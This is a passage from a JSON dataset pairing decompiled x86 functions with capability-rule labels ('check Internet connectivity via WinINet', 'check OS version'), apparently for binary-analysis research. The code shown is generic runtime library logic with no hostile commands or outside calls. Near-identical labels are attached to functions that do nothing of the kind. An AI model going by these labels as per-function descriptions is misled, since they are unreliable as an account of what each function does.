uVar10;\n                    uVar10 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -0x40) = uVar12;\n                    goto code_r0x00467ec7;\n                }\n                cVar5 = fcn.00401a9b(*(unaff_EBP + -0x48));\n                if (cVar5 != '\\0') {\ncode_r0x00467e8c:\n                    uVar10 = *(unaff_EBP + -0x30);\n                    uVar8 = uVar10;\n                    if (0x7e < uVar10) {\n                        uVar8 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar12) = uVar8;\n                    goto code_r0x00467ec7;\n                }\n                if (*(unaff_EBP + 0x18) == '\\x01') {\n                    iVar7 = *(unaff_EBP + -0x34);\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.00405c40();\n                        iVar7 = *(unaff_EBP + -0x34);\n                    }\n                    bVar13 = pcVar2[iVar11] == *(iVar7 + 6);\n                }\n                else {\n                    *(unaff_EBP + -0x4c) = pcVar2[iVar11];\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x10);\n                    (**0x573000)(*(unaff_EBP + -0x4c));\n                    uVar4 = (*pcVar3)();\n                    iVar7 = *(unaff_EBP + -0x34);\n                    *(unaff_EBP + -0x2a) = uVar4;\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.00405c40();\n                    }\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x10);\n                    (**0x573000)(*(iVar7 + 6));\n                    cVar5 = (*pcVar3)();\n                    uVar12 = *(unaff_EBP + -0x44);\n                    bVar13 = *(unaff_EBP + -0x2a) == cVar5;\n                }\n                if (!bVar13) goto code_r0x00467e8c;\n                uVar10 = *(unaff_EBP + -0x30);\n                cVar5 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar7 = unaff_EBP + -0x28;\n                if (bVar13) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                iVar11 = iVar11 + *(iVar7 + uVar12);\ncode_r0x00467ec7:\n                cVar5 = *(unaff_EBP + -0x29);\n            }\n            uVar12 = uVar12 + 1;\n            *(unaff_EBP + -0x44) = uVar12;\n        } while (uVar12 < *(unaff_EBP + -0x3c));\n        if ((cVar5 == '\\0') || (cVar5 = fcn.00401a9b(*(unaff_EBP + -0x48)),  cVar5 != '\\0')) break;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n        fcn.004047a5();\n        *(unaff_EBP + -0x40) = 0xffffffff;\n        uVar10 = *(unaff_EBP + -0x30);\n    }\n    fcn.004029b9();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 1844
    },
    "0041dc30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0041dc30(code **param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e510;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    var_20h = param_1;\n    fcn.00405a60(param_1 + 1);\n    ppcVar1 = var_20h;\n    if (var_8h != 0) {\n        fcn.00401e7e(var_20h);\n    }\n    *in_FS_OFFSET = var_18h;\n    return ppcVar1;\n}\n",
        "token_count": 252
    },
    "004013cf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.004013cf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    char cVar4;\n    uint uVar5;\n    uint noname_0;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_4h;\n    \n    fcn.0040536c(0x38);\n    iVar1 = *(unaff_EBP + 0x1c);\n    puVar2 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x44) = *(unaff_EBP + 8);\n    uVar5 = *(iVar1 + 0x30);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x24);\n    fcn.0040327e(uVar5);\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.0040471e(noname_0, unaff_EBP + -0x30, unaff_EBP + 0xc, unaff_EBP + 0x14, *(iVar1 + 0x14), \n                         unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004050a6();\n    if (*(unaff_EBP + -0x30) == '\\0') {\n        puVar3 = *(unaff_EBP + -0x34);\n        *puVar2 = 2;\n        *puVar3 = 0;\n    }\n    else {\n        uVar5 = fcn.00404214(unaff_EBP + -0x30, unaff_EBP + -0x40, uVar5, unaff_EBP + -0x38);\n        **(unaff_EBP + -0x34) = uVar5;\n        if ((*(unaff_EBP + -0x40) == unaff_EBP + -0x30) || (*(unaff_EBP + -0x38) != 0)) {\n            *puVar2 = 2;\n        }\n    }\n    cVar4 = fcn.00401a9b(unaff_EBP + 0x14);\n    if (cVar4 != '\\0') {\n        *puVar2 = *puVar2 | 1;\n    }\n    puVar3 = *(unaff_EBP + -0x44);\n    uVar5 = *(unaff_EBP + 0x10);\n    *puVar3 = *(unaff_EBP + 0xc);\n    puVar3[1] = uVar5;\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 697
    },
    "004013d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004013d9(uchar *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    uint32_t *puVar1;\n    uchar *arg_8h_00;\n    uint *puVar2;\n    uint arg_8h_01;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar *arg_ch_00;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        if (arg_8h != NULL) {\n            if ((arg_18h != NULL) && (arg_14h <= 0xffffffff / arg_10h)) {\ncode_r0x004ae72f:\n                puVar1 = arg_18h + 3;\n                if ((*puVar1 & 0x4c0) == 0) {\n                    var_10h = 0x1000;\n                }\n                else {\n                    var_10h = arg_18h[6];\n                }\n                uVar4 = arg_10h * arg_14h;\n                arg_8h_00 = arg_8h;\n                var_8h = arg_ch;\n                do {\n                    if (uVar4 == 0) {\n                        return arg_14h;\n                    }\n                    if ((arg_18h[3] & 0x4c0U) == 0) {\ncode_r0x004ae7c0:\n                        if (uVar4 < var_10h) {\n                            iVar3 = fcn.00404584(arg_18h);\n                            if (iVar3 == -1) goto code_r0x004ae882;\n                            if (var_8h == 0) goto code_r0x004ae856;\n                            *arg_8h_00 = iVar3;\n                            var_10h = arg_18h[6];\n                            uVar4 = uVar4 - 1;\n                            var_8h = var_8h - 1;\n                            uVar5 = 1;\n                        }\n                        else {\n                            uVar5 = uVar4;\n                            if (0x7fffffff < uVar4) {\n                                uVar5 = 0x7fffffff;\n                            }\n                            if (var_10h != 0) {\n                                uVar5 = uVar5 - uVar5 % var_10h;\n                            }\n                            if (var_8h < uVar5) {\ncode_r0x004ae856:\n                                if (arg_ch != 0xffffffff) {\n                                    fcn.0040314d(arg_8h, 0, arg_ch);\n                                }\n                                puVar2 = fcn.004039a4();\n                                *puVar2 = 0x22;\n                                goto code_r0x004ae6e8;\n                            }\n                            arg_18h[2] = 0;\n                            *arg_18h = arg_18h[1];\n                            arg_ch_00 = arg_8h_00;\n                            arg_8h_01 = fcn.00405f06(arg_18h);\n                            uVar5 = fcn.00406177(arg_8h_01, arg_ch_00, uVar5);\n                            if (uVar5 == 0) {\n                                LOCK();\n                                *puVar1 = *puVar1 | 8;\n                                goto code_r0x004ae882;\n                            }\n                            if (uVar5 < 0) goto code_r0x004ae879;\n                            uVar4 = uVar4 - uVar5;\n                            var_8h = var_8h - uVar5;\n                        }\n                    }\n                    else {\n                        uVar5 = arg_18h[2];\n                        if (uVar5 == 0) goto code_r0x004ae7c0;\n                        if (uVar5 < 0) {\ncode_r0x004ae879:\n                            LOCK();\n                            *puVar1 = *puVar1 | 0x10;\ncode_r0x004ae882:\n                            return (arg_10h * arg_14h - uVar4) / arg_10h;\n                        }\n                        if (uVar4 < uVar5) {\n                            uVar5 = uVar4;\n                        }\n                        if (var_8h < uVar5) goto code_r0x004ae856;\n                        fcn.004aea07(arg_8h_00, var_8h, *arg_18h, uVar5);\n                        uVar4 = uVar4 - uVar5;\n                        arg_18h[2] = arg_18h[2] - uVar5;\n                        *arg_18h = *arg_18h + uVar5;\n                        var_8h = var_8h - uVar5;\n                    }\n                    arg_8h_00 = arg_8h_00 + uVar5;\n                } while( true );\n            }\n            if (arg_ch != 0xffffffff) {\n                fcn.0040314d(arg_8h, 0, arg_ch);\n            }\n            if ((arg_18h != NULL) && (arg_14h <= 0xffffffff / arg_10h)) goto code_r0x004ae72f;\n        }\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\ncode_r0x004ae6e8:\n        fcn.00403751();\n    }\n    return 0;\n}\n",
        "token_count": 1244
    },
    "00401415": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00401415(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    int32_t iStack20;\n    \n    iStack20 = param_1;\n    uStack28 = 0x491f10;\n    uStack32 = *in_FS_OFFSET;\n    uVar2 = *0x56cca8 ^ &uStack32;\n    *in_FS_OFFSET = &uStack32;\n    while( true ) {\n        uVar1 = *(param_1 + 0xc);\n        if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;\n        uStack24 = *(*(param_1 + 8) + uVar1 * 0xc);\n        *(param_1 + 0xc) = uStack24;\n        if (*(*(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {\n            fcn.00405e84(0x101, uVar2);\n            fcn.00403bca();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 294
    },
    "004014bf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004014bf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    bool bVar3;\n    \n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if (iVar1 == 1) {\n        bVar3 = *(param_1 + 0x45c) == 2;\n    }\n    else {\n        if (iVar1 != 2) goto code_r0x0049bc33;\n        bVar3 = *(param_1 + 0x45c) == 0;\n    }\n    if (bVar3) {\n        return CONCAT31(Var2, 1);\n    }\ncode_r0x0049bc33:\n    return Var2 << 8;\n}\n",
        "token_count": 180
    },
    "004014ce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004014ce(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    bool bVar3;\n    \n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if (iVar1 == 1) {\n        bVar3 = *(param_1 + 0x45c) == 2;\n    }\n    else {\n        if (iVar1 != 2) goto code_r0x0049bc65;\n        bVar3 = *(param_1 + 0x45c) == 0;\n    }\n    if (bVar3) {\n        return CONCAT31(Var2, 1);\n    }\ncode_r0x0049bc65:\n    return Var2 << 8;\n}\n",
        "token_count": 180
    },
    "004014f1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004014f1(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004057e5(arg_ch);\n    if ((var_8h == 0) || (*(var_8h + 4) != 0x3a4)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.004c65df(arg_ch, arg_8h, 0, 3);\n    }\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return uVar1;\n}\n",
        "token_count": 197
    },
    "00401532": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401532(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x24) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00403607(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == 0x24)) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.00403819(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x32), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 440
    },
    "00401550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401550(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        uVar3 = *(*(in_ECX + 0x14) + -8);\n        arg_8h[1] = *(*(in_ECX + 0x14) + -4);\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar1 * 0x10, 4, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        puVar2 = *(in_ECX + 0x46c + uVar1 * 0x10);\n        uVar3 = puVar2[1];\n        *arg_8h = *puVar2;\n        arg_8h[1] = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 363
    },
    "00401569": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401569(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 344
    },
    "00401573": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401573(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    code *pcVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    \n    uVar4 = arg_8h;\n    if ((*in_ECX[8] == 0) || (piVar1 = in_ECX[0xc],  *piVar1 < 1)) {\n        pcVar3 = *(*in_ECX + 0xc);\n        (**0x573000)(uVar4);\n        uVar4 = (*pcVar3)();\n    }\n    else {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *in_ECX[8];\n        *in_ECX[8] = puVar2 + 1;\n        *puVar2 = arg_8h;\n    }\n    return uVar4;\n}\n",
        "token_count": 210
    },
    "00401582": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401582(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00405eed(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 350
    },
    "004613c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004613c0(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    bool bVar4;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (((**(in_ECX + 0x1c) == in_ECX + 0x3c) && (arg_14h == 1)) && (*(in_ECX + 0x38) == 0)) {\n        bVar4 = arg_ch != 0;\n        arg_ch = arg_ch - 1;\n        arg_10h = (arg_10h - 1) + bVar4;\n    }\n    if ((((*(in_ECX + 0x4c) == 0) || (var_8h = in_ECX,  var_4h = in_ECX,  cVar2 = fcn.0040386e(),  cVar2 == '\\0')) ||\n        ((((arg_ch | arg_10h) != 0 || (arg_14h != 1)) &&\n         (iVar3 = fcn.0040461f(*(in_ECX + 0x4c), arg_ch, arg_10h, arg_14h),  iVar3 != 0)))) ||\n       (iVar3 = fcn.00405984(*(in_ECX + 0x4c), &var_8h),  iVar3 != 0)) {\n        *arg_8h = -1;\n        arg_8h[1] = -1;\n        arg_8h[2] = 0;\n        arg_8h[3] = 0;\n        arg_8h[4] = 0;\n        arg_8h[5] = 0;\n    }\n    else {\n        fcn.004036cf();\n        iVar3 = *(in_ECX + 0x40);\n        iVar1 = *(in_ECX + 0x44);\n        arg_8h[2] = 0;\n        arg_8h[3] = 0;\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n        arg_8h[4] = iVar3;\n        arg_8h[5] = iVar1;\n    }\n    return;\n}\n",
        "token_count": 546
    },
    "0040163b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040163b(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        cVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 347
    },
    "00401654": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401654(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    \n    if ((*param_1[7] != 0) && (piVar1 = param_1[0xb],  0 < *piVar1)) {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *param_1[7];\n        *param_1[7] = puVar2 + 1;\n        return *puVar2;\n    }\n    pcVar3 = *(*param_1 + 0x1c);\n    (**0x573000)();\n    uVar4 = (*pcVar3)();\n    return uVar4;\n}\n",
        "token_count": 182
    },
    "004016ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004016ae(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **in_ECX;\n    \n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\n            *arg_ch = -1;\n        }\n        else {\n            *arg_ch = *arg_ch + 1;\n        }\n        uVar2 = *in_ECX & 0xffffff00 | *(*in_ECX + 3);\n    }\n    else {\n        *arg_ch = *arg_ch + 1;\n        (*in_ECX)[2] = (*in_ECX)[2] + 1;\n        ***in_ECX = arg_8h;\n        piVar1 = *in_ECX;\n        *piVar1 = *piVar1 + 2;\n        uVar2 = CONCAT31(piVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 243
    },
    "00401712": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401712(uint *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint unaff_ESI;\n    uint var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    cVar1 = **0x56f458;\n    if (cVar1 == '\\0') {\n        fcn.004017df(1);\n    }\n    else if ((cVar1 < '0') || ('9' < cVar1)) {\n        fcn.00401906(&var_58h);\n        if (var_50h != '\\0') {\n            *0x56f458 = *0x56f458 + 1;\n            var_50h = var_58h;\n            var_4ch = var_54h;\n            if ((arg_ch == 0x42) || (arg_ch == 0x41)) {\n                fcn.004054ed(&var_48h, 0x41, 0x54f404);\n                var_4ch = var_4ch & 0xffffff00;\n                fcn.0040323d(&var_48h);\n                goto code_r0x0048d8a6;\n            }\n        }\n        if (**0x56f458 == '\\0') {\n            puVar2 = fcn.004017df(1);\n            uVar3 = *puVar2;\n        }\n        else {\n            uVar3 = 0;\n            var_4ch = 2;\n            var_50h = 0;\n            puVar2 = &var_50h;\n        }\n        *arg_8h = uVar3;\n        arg_8h[1] = puVar2[1];\n    }\n    else {\n        *0x56f458 = *0x56f458 + 1;\n        fcn.0040128a(cVar1 + -0x2f, cVar1 + -0x2f >> 0x1f);\n    }\ncode_r0x0048d8a6:\n    fcn.00403085(unaff_ESI);\n    return;\n}\n",
        "token_count": 536
    },
    "0040178f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.0040178f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b058, 0xc);\n    if ((*(unaff_EBP + 0x10) != 0) && (*(unaff_EBP + 0x14) != 0)) {\n        lpCriticalSection = *(unaff_EBP + 0x18);\n        if (lpCriticalSection != 0) {\n            *(unaff_EBP + -0x1c) = 0;\n            fcn.004013f7(lpCriticalSection);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = fcn.004013d9(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                                 lpCriticalSection);\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004ae9d8();\n            goto code_r0x004ae989;\n        }\n        if (*(unaff_EBP + 0xc) != -1) {\n            fcn.0040314d(*(unaff_EBP + 8), 0, *(unaff_EBP + 0xc));\n        }\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    uVar2 = 0;\ncode_r0x004ae989:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 487
    },
    "00401794": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
